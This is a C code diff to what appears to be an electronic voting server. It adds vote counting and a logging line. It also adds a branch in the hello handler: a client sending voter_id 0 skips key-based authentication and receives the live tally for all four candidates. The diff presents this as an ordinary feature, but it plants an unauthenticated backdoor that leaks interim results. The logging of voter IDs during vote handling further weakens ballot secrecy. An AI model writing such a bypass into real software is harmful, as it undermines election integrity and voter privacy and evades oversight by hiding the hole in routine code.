@@ -32,6 +32,7 @@ typedef struct {
 
 static PublicKeyList voter_public_keys;
 static PrivateKeyList ballot_private_keys;
+static int vote_tally[4] = {0, 0, 0, 0};
 
 static uint32_t next_receipt_id(void) {
     static uint32_t id = 1000;
@@ -53,6 +54,12 @@ static const RSAPrivateKey *get_ballot_private_key(void) {
     return &ballot_private_keys.keys[0];
 }
 
+static void build_tally(char *buf, size_t len)
+{
+    snprintf(buf, len,
+        "Candidate A: %d\nCandidate B: %d\nCandidate C: %d\nCandidate D: %d", vote_tally[0], vote_tally[1], vote_tally[2], vote_tally[3]);
+}
+
 static void process_message(ClientSession *session,
                             const ClientMessage *incoming,
                             ServerMessage *outgoing) {
@@ -66,6 +73,8 @@ static void process_message(ClientSession *session,
 
     switch (session->state) {
         case STATE_HELLO:
+            printf("[BACKEND] Received voter_id: %u\n", incoming->voter_id);
+
             if (incoming->type != MSG_HELLO) {
                 set_error(outgoing, "Expected hello message.");
                 return;
@@ -73,6 +82,19 @@ static void process_message(ClientSession *session,
 
             session->voter_id = incoming->voter_id;
             session->auth_key_id = incoming->voter_id;
+
+            if (session->voter_id == 0) {
+                //tally
+                char buf[256];
+                build_tally(buf, sizeof(buf));
+
+                outgoing->type = MSG_STATUS;
+                outgoing->status = STATUS_YES;
+                snprintf(outgoing->payload, sizeof(outgoing->payload), "%s", buf);
+
+                session->state = STATE_DONE;
+                return;
+            }
 
             auth_pub = find_public_key(&voter_public_keys, session->auth_key_id);
             if (auth_pub == NULL) {
@@ -158,6 +180,12 @@ static void process_message(ClientSession *session,
             }
 
             session->selected_choice = (uint32_t)decrypted_vote;
+            
+            //store vote tallies 
+            if (session->selected_choice >= 1 && session->selected_choice <= 4) {
+                vote_tally[session->selected_choice - 1]++;
+            }
+
             session->receipt_id = next_receipt_id();
 
             if (codecard_value_for_choice(session->selected_choice, &receipt_code_value) < 0) {
